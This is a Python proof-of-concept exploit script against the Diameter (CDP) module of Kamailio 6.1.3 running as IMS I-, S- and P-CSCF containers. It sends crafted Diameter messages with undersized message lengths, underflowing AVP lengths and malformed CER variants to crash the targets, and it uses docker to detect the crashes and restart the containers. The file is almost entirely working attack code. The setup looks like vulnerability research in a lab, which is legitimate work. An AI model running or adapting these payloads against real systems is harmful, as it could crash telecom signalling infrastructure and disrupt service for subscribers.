#!/usr/bin/env python3
"""
Diameter Cx/Rx Interface Attack PoC
====================================
Two confirmed vulnerabilities in Kamailio CDP (Diameter) module:

VULN-A: receiver.c:621-627 Heap Buffer Overflow
  - shm_malloc(sp->length) allocates sp->length bytes
  - memcpy(sp->msg, sp->buf, 20) copies DIAMETER_HEADER_LEN (20) bytes
  - If sp->length < 20: heap overflow of (20 - sp->length) bytes

VULN-B: diameter_msg.c:567 Integer Underflow in AVP parsing
  - avp_data_len = avp_len - AVP_HDR_SIZE(avp_flags)
  - If avp_len < AVP_HDR_SIZE: unsigned integer underflow
  - avp_data_len becomes ~4GB, causing massive memory corruption

Target: Kamailio 6.1.3 CDP module (I-CSCF:3869, S-CSCF:3870, P-CSCF:3871)
"""

import socket
import struct
import subprocess
import time
import sys
import argparse


def check_container(name):
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', name],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def send_diameter_tcp(data, target_ip, target_port, timeout=5):
    """Send raw data over TCP and receive response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target_ip, target_port))
        sock.send(data)
        try:
            resp = sock.recv(65535)
            return resp
        except socket.timeout:
            return None
        finally:
            sock.close()
    except ConnectionRefusedError:
        return b"CONNECTION_REFUSED"
    except Exception as e:
        return str(e).encode()


def build_diameter_header(length, cmd_code=257, app_id=0, flags=0x80,
                          hbh=0x12345678, ete=0x87654321):
    """Build a Diameter message header (20 bytes)
    
    Format:
    - 1 byte: Version (must be 1)
    - 3 bytes: Message Length
    - 1 byte: Flags (0x80=Request, 0x40=Proxiable, 0x20=Error)
    - 3 bytes: Command Code
    - 4 bytes: Application-ID
    - 4 bytes: Hop-by-Hop Identifier
    - 4 bytes: End-to-End Identifier
    """
    header = struct.pack('!B', 1)                    # Version
    header += struct.pack('!I', length)[1:]           # Length (3 bytes)
    header += struct.pack('!B', flags)                # Flags
    header += struct.pack('!I', cmd_code)[1:]         # Command Code (3 bytes)
    header += struct.pack('!I', app_id)               # Application-ID
    header += struct.pack('!I', hbh)                  # Hop-by-Hop ID
    header += struct.pack('!I', ete)                  # End-to-End ID
    return header


def build_avp(code, flags, length, vendor_id=None, data=b''):
    """Build a Diameter AVP"""
    avp = struct.pack('!I', code)       # AVP Code (4 bytes)
    avp += struct.pack('!B', flags)      # AVP Flags (1 byte)
    avp += struct.pack('!I', length)[1:] # AVP Length (3 bytes)
    if vendor_id is not None and (flags & 0x80):
        avp += struct.pack('!I', vendor_id)  # Vendor-ID (4 bytes)
    avp += data
    # Pad to 4-byte boundary
    pad = (4 - (len(avp) % 4)) % 4
    avp += b'\x00' * pad
    return avp


class DiameterAttack:
    def __init__(self):
        self.results = []

    def log(self, msg):
        print(f"[*] {msg}")

    def record(self, vuln, target, crashed, details=""):
        self.results.append({
            'vuln': vuln,
            'target': target,
            'crashed': crashed,
            'details': details
        })
        status = "CRASHED" if crashed else "no crash"
        print(f"    Result: {status}")

    # ========================================================================
    # VULN-A: Heap overflow via undersized Diameter length field
    # ========================================================================
    def test_short_length_overflow(self, target_ip, target_port, target_name):
        """
        receiver.c: If Diameter message length < 20 (header size),
        shm_malloc(length) then memcpy of 20 bytes overflows the heap buffer.
        
        Attack: Send Diameter header with length field < 20
        """
        self.log(f"VULN-A: Diameter short length heap overflow -> {target_name}:{target_port}")

        # Test various undersized length values
        lengths = [0, 1, 2, 4, 8, 12, 16, 19]

        for length in lengths:
            print(f"  Testing length={length} (overflow by {20-length} bytes)")

            # Build header with undersized length
            data = build_diameter_header(length)

            resp = send_diameter_tcp(data, target_ip, target_port)
            time.sleep(0.5)

            if not check_container(target_name):
                self.record("VULN-A-short-len", target_name, True, f"length={length}")
                return True

            if resp and resp != b"CONNECTION_REFUSED":
                print(f"    Response: {resp[:40].hex() if isinstance(resp, bytes) else resp[:40]}")

        # Also test: length < 20 but with extra data
        print(f"  Testing length=1 with 100 bytes extra data")
        data = build_diameter_header(1) + b'\x41' * 100
        send_diameter_tcp(data, target_ip, target_port)
        time.sleep(0.5)
        if not check_container(target_name):
            self.record("VULN-A-short-len", target_name, True, "length=1+extra")
            return True

        self.record("VULN-A-short-len", target_name, False)
        return False

    # ========================================================================
    # VULN-B: Integer underflow in AVP data length calculation
    # ========================================================================
    def test_avp_integer_underflow(self, target_ip, target_port, target_name):
        """
        diameter_msg.c: avp_data_len = avp_len - AVP_HDR_SIZE(avp_flags)
        If avp_len < AVP_HDR_SIZE: unsigned integer underflow to ~4GB
        
        Attack: Send Diameter message with AVP where avp_len < header size
        """
        self.log(f"VULN-B: Diameter AVP integer underflow -> {target_name}:{target_port}")

        variants = []

        # Variant 1: AVP with len=1 (underflow: 1-8 = huge)
        # Build a valid Diameter message with one malicious AVP
        avp_data = b''
        # AVP: code=263(Session-Id), flags=0x40(Mandatory), len=1
        # avp_data_len = 1 - 8 = 4294967289 (underflow)
        avp1 = struct.pack('!I', 263)       # AVP Code
        avp1 += struct.pack('!B', 0x40)      # Flags (Mandatory, no V-bit)
        avp1 += struct.pack('!I', 1)[1:]     # Length = 1 (< 8 = header size)
        msg_len = 20 + len(avp1)
        msg = build_diameter_header(msg_len) + avp1
        variants.append(("avp_len_1", msg))

        # Variant 2: AVP with len=0 (skipped by check avp_len < 1)
        # But test anyway
        avp2 = struct.pack('!I', 263)
        avp2 += struct.pack('!B', 0x40)
        avp2 += struct.pack('!I', 0)[1:]     # Length = 0
        msg_len = 20 + len(avp2)
        msg = build_diameter_header(msg_len) + avp2
        variants.append(("avp_len_0", msg))

        # Variant 3: AVP with len=7 (just under header size)
        avp3 = struct.pack('!I', 263)
        avp3 += struct.pack('!B', 0x40)
        avp3 += struct.pack('!I', 7)[1:]     # Length = 7 (< 8)
        msg_len = 20 + len(avp3)
        msg = build_diameter_header(msg_len) + avp3
        variants.append(("avp_len_7", msg))

        # Variant 4: AVP with V-bit set, len=1 (1-12 = underflow)
        avp4 = struct.pack('!I', 263)
        avp4 += struct.pack('!B', 0xC0)      # Flags (Mandatory + V-bit)
        avp4 += struct.pack('!I', 1)[1:]     # Length = 1 (< 12)
        avp4 += struct.pack('!I', 10415)     # Vendor-ID (3GPP)
        msg_len = 20 + len(avp4)
        msg = build_diameter_header(msg_len) + avp4
        variants.append(("avp_vbit_len_1", msg))

        # Variant 5: Valid CER first, then malicious message
        # This may be needed to establish the Diameter connection
        cer_avps = b''
        # Origin-Host
        host = b'attacker.example.com'
        cer_avps += build_avp(264, 0x40, 8 + len(host), data=host)
        # Origin-Realm
        realm = b'example.com'
        cer_avps += build_avp(296, 0x40, 8 + len(realm), data=realm)
        # Host-IP-Address
        ip_data = b'\x00\x01' + socket.inet_aton('10.0.0.1')
        cer_avps += build_avp(257, 0x40, 8 + len(ip_data), data=ip_data)
        # Vendor-Id
        cer_avps += build_avp(266, 0x40, 12, data=struct.pack('!I', 10415))
        # Product-Name
        prod = b'DiameterFuzzer'
        cer_avps += build_avp(269, 0x00, 8 + len(prod), data=prod)
        # Auth-Application-Id
        cer_avps += build_avp(258, 0x40, 12, data=struct.pack('!I', 16777216))

        cer_msg = build_diameter_header(20 + len(cer_avps), cmd_code=257) + cer_avps

        # Malicious message after CER
        avp5 = struct.pack('!I', 263)
        avp5 += struct.pack('!B', 0x40)
        avp5 += struct.pack('!I', 1)[1:]
        mal_len = 20 + len(avp5)
        mal_msg = build_diameter_header(mal_len, cmd_code=280, app_id=16777216) + avp5

        variants.append(("cer_then_avp_underflow", cer_msg + mal_msg))

        for name, data in variants:
            print(f"  Variant: {name} ({len(data)} bytes)")
            resp = send_diameter_tcp(data, target_ip, target_port)
            time.sleep(0.5)

            if not check_container(target_name):
                self.record("VULN-B-avp-underflow", target_name, True, name)
                return True

            if resp and resp != b"CONNECTION_REFUSED":
                if isinstance(resp, bytes) and len(resp) >= 20:
                    # Parse response
                    version = resp[0]
                    resp_len = int.from_bytes(resp[1:4], 'big')
                    resp_flags = resp[4]
                    resp_cmd = int.from_bytes(resp[5:8], 'big')
                    print(f"    Response: v={version} len={resp_len} flags=0x{resp_flags:02x} cmd={resp_cmd}")
                else:
                    print(f"    Response: {resp[:60]}")

        self.record("VULN-B-avp-underflow", target_name, False)
        return False

    # ========================================================================
    # VULN-C: Malformed Diameter CER with various attacks
    # ========================================================================
    def test_malformed_cer(self, target_ip, target_port, target_name):
        """Test various malformed CER messages"""
        self.log(f"VULN-C: Malformed CER attacks -> {target_name}:{target_port}")

        variants = []

        # 16 null bytes as AVP payload (CVE-2020-6098 pattern)
        avp_null = struct.pack('!I', 0)      # AVP Code = 0
        avp_null += struct.pack('!B', 0)      # Flags = 0
        avp_null += struct.pack('!I', 0)[1:]  # Length = 0
        avp_null += b'\x00' * 16              # 16 null bytes payload
        msg_len = 20 + len(avp_null)
        variants.append(("null_16", build_diameter_header(msg_len) + avp_null))

        # Huge AVP count (many small AVPs)
        many_avps = b''
        for i in range(100):
            avp = build_avp(300 + i, 0x00, 12, data=b'ab')
            many_avps += avp
        msg_len = 20 + len(many_avps)
        variants.append(("many_avps_100", build_diameter_header(msg_len) + many_avps))

        # Nested grouped AVP with malformed inner AVP
        inner_avp = struct.pack('!I', 263)
        inner_avp += struct.pack('!B', 0x40)
        inner_avp += struct.pack('!I', 1)[1:]  # Malformed inner AVP
        outer_data = inner_avp
        outer_avp = build_avp(268, 0x40, 8 + len(outer_data), data=outer_data)
        msg_len = 20 + len(outer_avp)
        variants.append(("nested_malformed", build_diameter_header(msg_len) + outer_avp))

        # Message length = exactly 20 (header only, no AVPs)
        variants.append(("header_only", build_diameter_header(20)))

        # Message length = 21 (header + 1 byte)
        variants.append(("header_plus_1", build_diameter_header(21) + b'\x41'))

        # Message with wrong version
        bad_ver = bytearray(build_diameter_header(20))
        bad_ver[0] = 99  # Invalid version
        variants.append(("bad_version", bytes(bad_ver)))

        for name, data in variants:
            print(f"  Variant: {name} ({len(data)} bytes)")
            resp = send_diameter_tcp(data, target_ip, target_port)
            time.sleep(0.5)

            if not check_container(target_name):
                self.record("VULN-C-malformed", target_name, True, name)
                return True

        self.record("VULN-C-malformed", target_name, False)
        return False


def main():
    parser = argparse.ArgumentParser(description='Diameter Cx/Rx Attack PoC')
    parser.add_argument('--target', choices=['icscf', 'scscf', 'pcscf', 'all'],
                        default='all', help='Target CSCF')
    parser.add_argument('--vuln', default='all',
                        help='Vulnerability: a, b, c, or all')
    args = parser.parse_args()

    print("=" * 70)
    print("Diameter Cx/Rx Interface Attack PoC")
    print("Target: Kamailio CDP module")
    print("=" * 70)

    targets = {
        'icscf': ('172.22.0.19', 3869, 'icscf'),
        'scscf': ('172.22.0.20', 3870, 'scscf'),
        'pcscf': ('172.22.0.21', 3871, 'pcscf'),
    }

    if args.target == 'all':
        target_list = targets.values()
    else:
        target_list = [targets[args.target]]

    attack = DiameterAttack()

    for ip, port, name in target_list:
        print(f"\n{'=' * 60}")
        print(f"Target: {name} ({ip}:{port})")
        print(f"{'=' * 60}")

        tests = [
            ('a', lambda: attack.test_short_length_overflow(ip, port, name)),
            ('b', lambda: attack.test_avp_integer_underflow(ip, port, name)),
            ('c', lambda: attack.test_malformed_cer(ip, port, name)),
        ]

        for vuln_id, test_func in tests:
            if args.vuln == 'all' or args.vuln == vuln_id:
                try:
                    if test_func():
                        print(f"\n*** CRASH DETECTED on {name} ***")
                        subprocess.run(['docker', 'restart', name],
                                      capture_output=True)
                        time.sleep(10)
                except Exception as e:
                    print(f"Error: {e}")
                time.sleep(1)

    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)

    crashes = [r for r in attack.results if r['crashed']]
    if crashes:
        print(f"\nCrashes detected: {len(crashes)}")
        for c in crashes:
            print(f"  - {c['vuln']} on {c['target']}: {c['details']}")
    else:
        print("\nNo crashes detected.")
        print("The Diameter module may handle these malformed inputs gracefully.")


if __name__ == '__main__':
    main()
